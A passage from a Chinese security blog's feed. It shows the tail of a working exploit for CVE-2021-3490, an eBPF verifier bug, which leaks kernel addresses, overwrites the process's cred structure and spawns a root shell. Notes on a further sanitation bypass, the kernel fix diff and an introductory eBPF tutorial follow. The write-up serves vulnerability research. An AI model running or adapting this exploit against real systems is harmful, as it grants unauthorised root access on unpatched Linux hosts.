ARRAY_MAP_OPS;<br>    kernel_base += kernel_offset;<br>    init_cred = INIT_CRED + kernel_offset;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Get array_map_ops leak: \033[0m%lx\n&quot;</span>, value[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] kernel_offset: \033[0m%lx\n&quot;</span>, kernel_offset);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] kernel_base: \033[0m%lx\n&quot;</span>, kernel_base);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[*] Leaking addr of bpf_map ...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (leak_map_addr(map_fd) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to run the eBPF prog!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[*] Checking for leek...&quot;</span>);<br>    key = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (bpf_map_lookup_elem(map_fd, &amp;key, &amp;value) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to look up value!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (value[<span class="hljs-number">0</span>] &lt; <span class="hljs-number">0xffff000000000000</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Got bad value: %lx\n&quot;</span>, value[<span class="hljs-number">0</span>]);<br>        err_exit(<span class="hljs-string">&quot;FAILED to leak addr of bpf_map!&quot;</span>);<br>    &#125;<br><br>    map_addr = value[<span class="hljs-number">0</span>] - <span class="hljs-number">0x110</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Get addr of bpf_map: \033[0m%lx\n&quot;</span>, map_addr);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[*] Search for current task_struct&#x27;s addr...&quot;</span>);<br>    current_task = search_for_current_task(map_fd);<br>    current_cred = read_arbitrary_addr(map_fd, current_task + <span class="hljs-number">0xad8</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Get current task_struct&#x27;s addr: \033[0m%lx\n&quot;</span>,<br>           current_task);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Get current cred&#x27;s addr: \033[0m%lx\n&quot;</span>,<br>           current_cred);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[*] Hijacking the bpf_map...&quot;</span>);<br>    make_arbitrary_write_ops(map_fd);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[*] Overwriting the current-&gt;cred...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>        <span class="hljs-keyword">if</span> (arbitrary_write_4_bytes_by_map(map_fd, current_cred+<span class="hljs-number">4</span>+<span class="hljs-number">4</span>*i, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to ovwerwrite no.%d\033[0m\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to call ops-&gt;map_push_elem()!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* record the log in to file here */</span><br>    log_fd = open(<span class="hljs-string">&quot;./log.txt&quot;</span>, O_RDWR | O_CREAT);<br>    <span class="hljs-keyword">if</span> (log_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to create log file!&quot;</span>);<br>    &#125;<br>    write(log_fd, bpf_log_buf, <span class="hljs-built_in">strlen</span>(bpf_log_buf));<br>    close(log_fd);<br><br>    get_root_shell();<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>运行即可完成提权：</p><p><img src="https://s2.loli.net/2023/06/07/x9RAdDMlZr4wF65.png" alt="image.png"></p><blockquote><p>第一次真正从头开始做 eBPF 相关的利用，说实话还是挺有意思的，不过虚拟机的各种实现细节确实比想象中要庞大得多（<del>那一天，a3 终于回忆起本科阶段做用户态 vm pwn 逆向半天逆到头大的痛苦</del>）</p></blockquote><h2 id="Extra-New-ALU-Sanitation-bypass"><a href="#Extra-New-ALU-Sanitation-bypass" class="headerlink" title="Extra. New ALU Sanitation bypass"></a>Extra. New ALU Sanitation bypass</h2><p>在 <a href="https://git.kernel.org/pub/scm/linux/kernel/git/bpf/bpf.git/commit/?id=7fedb63a8307dda0ec3b8969a3b233a1dd7ea8e0">这个 commit</a> 中 ALU Sanitation 又得到了进一步的加强：</p><ul><li><code>alu_limit</code> 的计算方式发生了改变，不是使用指针寄存器的当前位置，而是使用一个 <code>offset</code> 寄存器</li><li>被认为是常数的寄存器赋值<strong>会被直接更改为常量赋值</strong></li></ul><p>这两个新特性的引入<strong>使得本文所用的攻击方法近乎完全失效</strong>，不过这并不代表我们不能完成利用，在 <a href="https://cjovi.icu/WP/1604.html">D^3CTF2022-d3bpf-v2</a> 中来自 vidar-team 的 chuj 师傅展示了一个新的技巧——由于 <code>bpf_skb_load_bytes()</code> 会将一个 <code>sk_buff</code> 的数据读到栈上，因此我们可以利用运行时为 1、verifier 确信为 0 的寄存器构造一个较长的 <code>len</code> 参数，<strong>从而使得数据拷贝时发生栈溢出</strong></p><p>我们或许还需要额外的办法泄露内核地址，一个可行的方式是直接造成 kernel oops 后通过 dmesg 泄露出内核信息，这个技巧对于总会设置 <code>oops=panic</code> 的 CTF 题并不可用，但是<strong>大部分的真实世界环境其实都不会在 soft panic 发生时直接 panic</strong> （<code>/proc/sys/kernel/panic_on_oops == 0</code>），因此这个方法的可行性其实还是挺高的</p><h1 id="0x03-漏洞修复"><a href="#0x03-漏洞修复" class="headerlink" title="0x03. 漏洞修复"></a>0x03. 漏洞修复</h1><p>在 <a href="https://git.kernel.org/pub/scm/linux/kernel/git/bpf/bpf.git/commit/?id=049c4e13714ecbca567b4d5f6d563f05d431c80e">这个 commit</a> 中完成了对漏洞的修补操作,漏洞的修复方式也比较简单，只需要将缺失的设置 32 位边界的操作补充上就行：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs diff"><br><span class="hljs-comment">diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c</span><br><span class="hljs-comment">index 757476c91c984..9352a1b7de2dd 100644</span><br><span class="hljs-comment">--- a/kernel/bpf/verifier.c</span><br><span class="hljs-comment">+++ b/kernel/bpf/verifier.c</span><br><span class="hljs-meta">@@ -7084,11 +7084,10 @@</span> static void scalar32_min_max_and(struct bpf_reg_state *dst_reg,<br> s32 smin_val = src_reg-&gt;s32_min_value;<br> u32 umax_val = src_reg-&gt;u32_max_value;<br> <br><span class="hljs-deletion">-/* Assuming scalar64_min_max_and will be called so its safe</span><br><span class="hljs-deletion">- * to skip updating register for known 32-bit case.</span><br><span class="hljs-deletion">- */</span><br><span class="hljs-deletion">-if (src_known &amp;&amp; dst_known)</span><br><span class="hljs-addition">+if (src_known &amp;&amp; dst_known) &#123;</span><br><span class="hljs-addition">+__mark_reg32_known(dst_reg, var32_off.value);</span><br> return;<br><span class="hljs-addition">+&#125;</span><br> <br> /* We get our minimum from the var_off, since that&#x27;s inherently<br>  * bitwise.  Our maximum is the minimum of the operands&#x27; maxima.<br><span class="hljs-meta">@@ -7108,7 +7107,6 @@</span> static void scalar32_min_max_and(struct bpf_reg_state *dst_reg,<br> dst_reg-&gt;s32_min_value = dst_reg-&gt;u32_min_value;<br> dst_reg-&gt;s32_max_value = dst_reg-&gt;u32_max_value;<br> &#125;<br><span class="hljs-deletion">-</span><br> &#125;<br> <br> static void scalar_min_max_and(struct bpf_reg_state *dst_reg,<br><span class="hljs-meta">@@ -7155,11 +7153,10 @@</span> static void scalar32_min_max_or(struct bpf_reg_state *dst_reg,<br> s32 smin_val = src_reg-&gt;s32_min_value;<br> u32 umin_val = src_reg-&gt;u32_min_value;<br> <br><span class="hljs-deletion">-/* Assuming scalar64_min_max_or will be called so it is safe</span><br><span class="hljs-deletion">- * to skip updating register for known case.</span><br><span class="hljs-deletion">- */</span><br><span class="hljs-deletion">-if (src_known &amp;&amp; dst_known)</span><br><span class="hljs-addition">+if (src_known &amp;&amp; dst_known) &#123;</span><br><span class="hljs-addition">+__mark_reg32_known(dst_reg, var32_off.value);</span><br> return;<br><span class="hljs-addition">+&#125;</span><br> <br> /* We get our maximum from the var_off, and our minimum is the<br>  * maximum of the operands&#x27; minima<br><span class="hljs-meta">@@ -7224,11 +7221,10 @@</span> static void scalar32_min_max_xor(struct bpf_reg_state *dst_reg,<br> struct tnum var32_off = tnum_subreg(dst_reg-&gt;var_off);<br> s32 smin_val = src_reg-&gt;s32_min_value;<br> <br><span class="hljs-deletion">-/* Assuming scalar64_min_max_xor will be called so it is safe</span><br><span class="hljs-deletion">- * to skip updating register for known case.</span><br><span class="hljs-deletion">- */</span><br><span class="hljs-deletion">-if (src_known &amp;&amp; dst_known)</span><br><span class="hljs-addition">+if (src_known &amp;&amp; dst_known) &#123;</span><br><span class="hljs-addition">+__mark_reg32_known(dst_reg, var32_off.value);</span><br> return;<br><span class="hljs-addition">+&#125;</span><br> <br> /* We get both minimum and maximum from the var32_off. */<br> dst_reg-&gt;u32_min_value = var32_off.value;<br></code></pre></td></tr></table></figure><p>笔者认为这个修补方式还是比较成功的</p><h1 id="0xFF-REFERENCE"><a href="#0xFF-REFERENCE" class="headerlink" title="0xFF. REFERENCE"></a>0xFF. REFERENCE</h1><p><a href="https://bsauce.github.io/2021/08/31/CVE-2021-3490">【kernel exploit】CVE-2021-3490 eBPF 32位边界计算错误漏洞</a></p><p><a href="https://xz.aliyun.com/t/11165">eBPF漏洞CVE-2021-3490分析与利用</a></p><p><a href="https://a1ex.online/2021/08/16/ebpf-pwn-A-Love-Story/">ebpf-pwn-A-Love-Story</a></p><p><a href="https://cjovi.icu/WP/1604.html">D^3CTF2022-d3bpf,d3bpf-v2-WP</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;那一天，a3 终于回想起了被 VM Pwn 支配的恐怖&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="https://arttnba3.github.io/categories/CVE/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Pwn" scheme="https://arttnba3.github.io/tags/Pwn/"/>
    
    <category term="Linux Kernel" scheme="https://arttnba3.github.io/tags/Linux-Kernel/"/>
    
    <category term="CVE" scheme="https://arttnba3.github.io/tags/CVE/"/>
    
    <category term="提权" scheme="https://arttnba3.github.io/tags/%E6%8F%90%E6%9D%83/"/>
    
    <category term="eBPF" scheme="https://arttnba3.github.io/tags/eBPF/"/>
    
  </entry>
  
  <entry>
    <title>【EBPF.0x00】eBPF 入门指北（一）：简介</title>
    <link href="https://arttnba3.github.io/2023/05/31/EBPF_0X00/"/>
    <id>https://arttnba3.github.io/2023/05/31/EBPF_0X00/</id>
    <published>2023-05-30T19:46:24.000Z</published>
    <updated>2023-06-06T21:37:07.000Z</updated>
    
    <content type="html"><![CDATA[<p>BEE BEE I’M A SHEEP</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><blockquote><p>因为最近毕设搞得有点头大（←因为这个人各种摸鱼导致进度差的太多然后最后几天疯狂各种赶工），所以看点和毕设无关的东西（这样毕设不是更加做不完了嘛（悲）</p></blockquote><p>笔者一直想着有机会深入学习一下 eBPF 相关的东西，可惜总是习惯性一头扎进源码各种繁杂的细节当中迷失自己然后放弃（悲）</p><p><del>于是趁现在有时间（？）</del> 虽然现在没什么时间，笔者还是想给这玩意先开个头写第一篇博客，毕竟只要开了一个头之后后面的事情也就会简单得多了吧（大嘘）</p><h2 id="What-is-eBPF"><a href="#What-is-eBPF" class="headerlink" title="What is eBPF?"></a>What is eBPF?</h2><p><strong>伯克利包过滤器</strong>（Berkeley Packet Filter）是一个 Linux kernel 中用以对来自于链路层的数据包进行过滤的架构，其位于内核中的架构如下图所示：</p><p><img src="https://s2.loli.net/2022/07/21/Cpf7VY9z5lsG2u3.png" alt="image.png"></p><p>相比起传统的数据包过滤器而言，BPF <strong>在内核中</strong>实现了一个新的<strong>虚拟机</strong>设计，通过<strong>即时编译</strong>（Just-In-Time compilation）技术将 BPF 指令翻译为 BPF 虚拟机的字节码，可以高效地工作在基于寄存器结构的 CPU 上</p><p>Linux kernel 自 3.18 版本起提供了<strong>扩展伯克利包过滤器</strong>（<strong>e</strong>xtended <strong>BPF</strong>，即 <code>eBPF</code>），其应用范围更广，能够被应用于更多的场景，原来的 BPF 被称为 <strong>c</strong>lassic <strong>BPF</strong>（cBPF），且目前基本上已经被废弃，Linux 会将 cBPF 字节码转化为 eBPF 字节码再执行</p><p>作为一个<strong>位于内核层面的虚拟机</strong>，eBPF 无疑为攻击者提供了一个相当大的新攻击面，因此也成为近几年内核利用中的“大热门”，本篇博客中笔者将简述 eBPF 的基本原理</p><blockquote><p>本篇文章中涉及到的 Linux kernel 源码来自版本 6.3.2</p></blockquote><h1 id="0x01-eBPF-的基本架构"><a href="#0x01-eBPF-的基本架构" class="headerlink" title="0x01.eBPF 的基本架构"></a>0x01.eBPF 的基本架构</h1><h2 id="一、eBPF-的运行过程"><a href="#一、eBPF-的运行过程" class="headerlink" title="一、eBPF 的运行过程"></a>一、eBPF 的运行过程</h2><p>Linux 下 eBPF 的整体架构如下图所示：</p><p><img src="https://s2.loli.net/2022/03/20/HfExF3JwKX9nOvi.png" alt="image.png"></p><ul><li>用户进程首先在用户空间编写相应的 BPF 字节码程序，传入内核</li><li>内核通过 <code>verifier</code> 对字节码程序进行安全性检查，通过检查后便通过 JIT 编译运行，eBPF 程序主要分为如下类型：<ul><li><code>kprobes</code> ：内核中的动态跟踪，可以跟踪至内核中的函数入口或返回点</li><li><code>uprobes</code> ：用户空间中的动态跟踪，与 kprobes 不同的是跟踪的函数位于用户程序中</li><li><code>tracepoints</code> ：内核中的静态跟踪</li><li><code>perf_events</code> ：定时采样与 PMC</li></ul></li><li>映射（map）作为用以保存数据的通用结构，可以在不同的 eBPF 程序之间或是用户进程与内核间共享数据</li></ul><blockquote><p>不同版本的 eBPF 所支持的功能是不同的，参见<a href="https://github.com/iovisor/bcc/blob/master/docs/kernel-versions.md">这↑里↓</a></p><table><thead><tr><th>version</th><th>功能</th></tr></thead><tbody><tr><td>4.1</td><td>kprobe support</td></tr><tr><td>4.4</td><td>Perf events</td></tr><tr><td>4.7</td><td>Tracepoints support</td></tr><tr><td>4.8</td><td>XDP core</td></tr><tr><td>4.10</td><td>cgroups support</td></tr></tbody></table></blockquote><p>一个 eBPF 程序可以被挂载到多个事件上，不同的 eBPF 程序之间可以共享同一个映射</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">tracing     tracing    tracing    packet      packet     packet<br>event A     event B    event C    on eth0     on eth1    on eth2<br> |<span class="hljs-string">             </span>|<span class="hljs-string">         </span>|<span class="hljs-string">          </span>|<span class="hljs-string">           </span>|<span class="hljs-string">          ^</span><br><span class="hljs-string"> </span>|<span class="hljs-string">             </span>|<span class="hljs-string">         </span>|<span class="hljs-string">          </span>|<span class="hljs-string">           v          </span>|<br> --&gt; tracing <span class="hljs-variable">&lt;--     tracing      socket    tc ingress   tc egress</span><br><span class="hljs-variable">      prog_1          prog_2      prog_3    classifier    action</span><br><span class="hljs-variable">      |  |              |           |         prog_4      prog_5</span><br><span class="hljs-variable">   |---  -----|  |------|          map_3        |           |</span><br><span class="hljs-variable"> map_1       map_2                              --| map_4 |--</span><br></code></pre></td></tr></table></figure><h2 id="二、eBPF-verifier"><a href="#二、eBPF-verifier" class="headerlink" title="二、eBPF verifier"></a>二、eBPF verifier</h2><p>在 eBPF 字节码被传入到内核空间后，其首先需要经过 <code>verifier</code> 的安全检查，之后才能进行 JIT 编译，verifier 主要检查以下几点：</p><ul><li>没有回向边（back edge）、环路（loop）、不可达（unreachable）指令</li><li>不能在指针之间进行比较，指针只能与标量进行加减（eBPF 中的标量值为不从指针派生的值），verifier 会追踪哪些寄存器包含指针、哪些寄存器包含标量值</li><li>指针运算不能离开一个 map 的“安全”边界，这意味着程序不能访问预定义的 map 外的内存，verifier 通过追踪每个寄存器值的上界与下界</li><li>不能将指针存储在 map 中或作为返回值，以避免将内核地址泄露到用户空间</li></ul><p>在 <code>kernel/bpf/verifier.c</code>  开头注释阐述如下：</p><blockquote><p>这里为了方便阅读，有的保留原文没有翻译</p><blockquote><p>比如说直接说 <code>map element key</code> 你肯定知道是什么东西，但是我要是说 <code>映射元素键</code> 那你肯定得楞一会….</p></blockquote></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* bpf_check() 是一个静态代码分析器，其逐条遍历 eBPF 程序中的指令，</span><br><span class="hljs-comment"> * 并更新寄存器/堆栈的状态。</span><br><span class="hljs-comment"> * 条件分支的所有路径都会被分析，直到 &#x27;bpf_exit&#x27; 指令。</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 首先通过深度优先搜索检查程序是否为有向无环图（Directed Acyclic Graph）</span><br><span class="hljs-comment"> * 其拒绝以下程序:</span><br><span class="hljs-comment"> * - 指令数大于 BPF_MAXINSNS </span><br><span class="hljs-comment"> * - 出现了循环 (通过后向边检测)</span><br><span class="hljs-comment"> * - 存在不可达指令 (不应当是一个森林. 程序 = 一个函数)</span><br><span class="hljs-comment"> * - 越界或畸形跳转</span><br><span class="hljs-comment"> * 接着是第一条指令展开的所有可能路径。</span><br><span class="hljs-comment"> * 由于其分析程序中所有的路径，分析的长度被限制为 64k 指令，</span><br><span class="hljs-comment"> * 即使总的指令数仅有 4k 可也能达到，但这有太多的会改变栈/寄存器的分支。</span><br><span class="hljs-comment"> * “被分析的分支”的数量被限制在 1k</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 在每条指令的入口，每个寄存器都有一个类型，该指令根据指令语义改变寄存器的类型。</span><br><span class="hljs-comment"> * 若指令为 BPF_MOV64_REG(BPF_REG_1, BPF_REG_5),  则 R5 的类型会被复制给 R1</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 所有的寄存器都是 64 位的</span><br><span class="hljs-comment"> * R0 - 返回寄存器</span><br><span class="hljs-comment"> * R1-R5 传参寄存器</span><br><span class="hljs-comment"> * R6-R9 callee 保存的寄存器</span><br><span class="hljs-comment"> * R10 - 只读帧指针</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 在 BPF 程序起始， R1 寄存器包含一个指向 bpf_context 的指针，</span><br><span class="hljs-comment"> * 其类型为 PTR_TO_CTX.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Verifier 跟踪指针上的运算，以免:</span><br><span class="hljs-comment"> *    BPF_MOV64_REG(BPF_REG_1, BPF_REG_10),</span><br><span class="hljs-comment"> *    BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, -20),</span><br><span class="hljs-comment"> * 第一条指令将 R10 (FRAME_PTR) 的类型拷贝给 R1，</span><br><span class="hljs-comment"> * 第二条算术指令通过模式匹配以识别其想要构造一个指向栈内元素的指针。</span><br><span class="hljs-comment"> * 因此在第二条指令后，寄存器 R1 的类型为 PTR_TO_STACK</span><br><span class="hljs-comment"> * (以及常量 -20 被存储用作未来的栈边界检查).</span><br><span class="hljs-comment"> * 这意味着该寄存器为一个指向[栈 + 已知立即数常量]的指针</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 大部分情况下寄存器都有着 SCALAR_VALUE 类型，</span><br><span class="hljs-comment"> * 这意味着寄存器存储着一些值，但并非一个可用的指针.</span><br><span class="hljs-comment"> * (例如指针加上指针会变为 SCALAR_VALUE 类型)</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 当 verifier 遇到 load 或 store 指令时基寄存器（base register）的类型可以为：</span><br><span class="hljs-comment"> * PTR_TO_MAP_VALUE, PTR_TO_CTX, PTR_TO_STACK, PTR_TO_SOCKET.</span><br><span class="hljs-comment"> * 这些是 4 种被 check_mem_access() 函数所识别的指针类型.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * PTR_TO_MAP_VALUE 意为该寄存器指向 &#x27;map element value&#x27;</span><br><span class="hljs-comment"> * 可访问的范围为 [ptr, ptr + map&#x27;s value_size).</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 用以在函数调用时传值的寄存器被根据函数参数约束进行检查</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * ARG_PTR_TO_MAP_KEY 便是其中一个这样的参数约束.</span><br><span class="hljs-comment"> * 其意为传递给该函数的寄存器类型必须为 PTR_TO_STACK</span><br><span class="hljs-comment"> * 且其在函数内将被作为 &#x27;pointer to map element key&#x27; 使用</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 例如，这些是 bpf_map_lookup_elem() 的参数约定:</span><br><span class="hljs-comment"> *   .ret_type = RET_PTR_TO_MAP_VALUE_OR_NULL,</span><br><span class="hljs-comment"> *   .arg1_type = ARG_CONST_MAP_PTR,</span><br><span class="hljs-comment"> *   .arg2_type = ARG_PTR_TO_MAP_KEY,</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * ret_type 表示该函数返回 &#x27;pointer to map elem value or null&#x27;</span><br><span class="hljs-comment"> * 函数希望第一个参数为一个指向 &#x27;struct bpf_map&#x27; 的常量指针，</span><br><span class="hljs-comment"> * 第二个参数则应为指向栈的指针，其会在 helper 函数内用作</span><br><span class="hljs-comment"> * 指向[map element key]的指针</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 内核侧的 helper 函数有如下形式:</span><br><span class="hljs-comment"> * u64 bpf_map_lookup_elem(u64 r1, u64 r2, u64 r3, u64 r4, u64 r5)</span><br><span class="hljs-comment"> * &#123;</span><br><span class="hljs-comment"> *    struct bpf_map *map = (struct bpf_map *) (unsigned long) r1;</span><br><span class="hljs-comment"> *    void *key = (void *) (unsigned long) r2;</span><br><span class="hljs-comment"> *    void *value;</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *    这里内核可以安全地访问 &#x27;key&#x27; 与 &#x27;map&#x27; 指针, 知晓</span><br><span class="hljs-comment"> *    [key, key + map-&gt;key_size) 字节为可用的且被</span><br><span class="hljs-comment"> *    初始化在 eBPF 程序的栈上.</span><br><span class="hljs-comment"> * &#125;</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 相应的 eBPF 程序或许形如:</span><br><span class="hljs-comment"> *    BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),  // 这条指令后 R2 的类型为 FRAME_PTR</span><br><span class="hljs-comment"> *    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4), // 这条指令后 R2 的类型为 PTR_TO_STACK</span><br><span class="hljs-comment"> *    BPF_LD_MAP_FD(BPF_REG_1, map_fd),      // 这条指令后 R1 的类型为 CONST_PTR_TO_MAP</span><br><span class="hljs-comment"> *    BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),</span><br><span class="hljs-comment"> * 这里 verifier 关注 map_lookup_elem() 的原型，会看到:</span><br><span class="hljs-comment"> * .arg1_type == ARG_CONST_MAP_PTR 以及 R1-&gt;type == CONST_PTR_TO_MAP, 这是 🆗 的,</span><br><span class="hljs-comment"> * 现在 verifier 知道该 map 有一个 R1-&gt;map_ptr-&gt;key_size 字节的 key</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 然后， .arg2_type == ARG_PTR_TO_MAP_KEY and R2-&gt;type == PTR_TO_STACK, 到现在还🆗,</span><br><span class="hljs-comment"> * 现在 verifier 检查 [R2, R2 + map&#x27;s key_size) 在栈的限制内，</span><br><span class="hljs-comment"> * 且在该调用之前被初始化.</span><br><span class="hljs-comment"> * 若🆗, verifier 接下来允许该 BPF_CALL 指令并关注</span><br><span class="hljs-comment"> * .ret_type （为 RET_PTR_TO_MAP_VALUE_OR_NULL）, 故让</span><br><span class="hljs-comment"> * R0-&gt;type = PTR_TO_MAP_VALUE_OR_NULL ，这意味着 bpf_map_lookup_elem() 函数</span><br><span class="hljs-comment"> * 返回指向 map value 的指针或 NULL.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 当类型 PTR_TO_MAP_VALUE_OR_NULL 通过 &#x27;if (reg != 0) goto +off&#x27; 指令，</span><br><span class="hljs-comment"> * 在 true 分支中持有指针的寄存器将状态改变为 PTR_TO_MAP_VALUE，</span><br><span class="hljs-comment"> * 在 false 分支中同样的寄存器将状态改变为 CONST_IMM 。</span><br><span class="hljs-comment"> * 参见 check_cond_jmp_op().</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 在调用后 R0 被设为函数返回值，寄存器 R1-R5 被设为 NOT_INIT</span><br><span class="hljs-comment"> * 以表示其不再可读.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 以下引用类型表示一个对内核资源的潜在引用，</span><br><span class="hljs-comment"> * 在其第一次被分配后， BPF 程序必须检查并释放该资源:</span><br><span 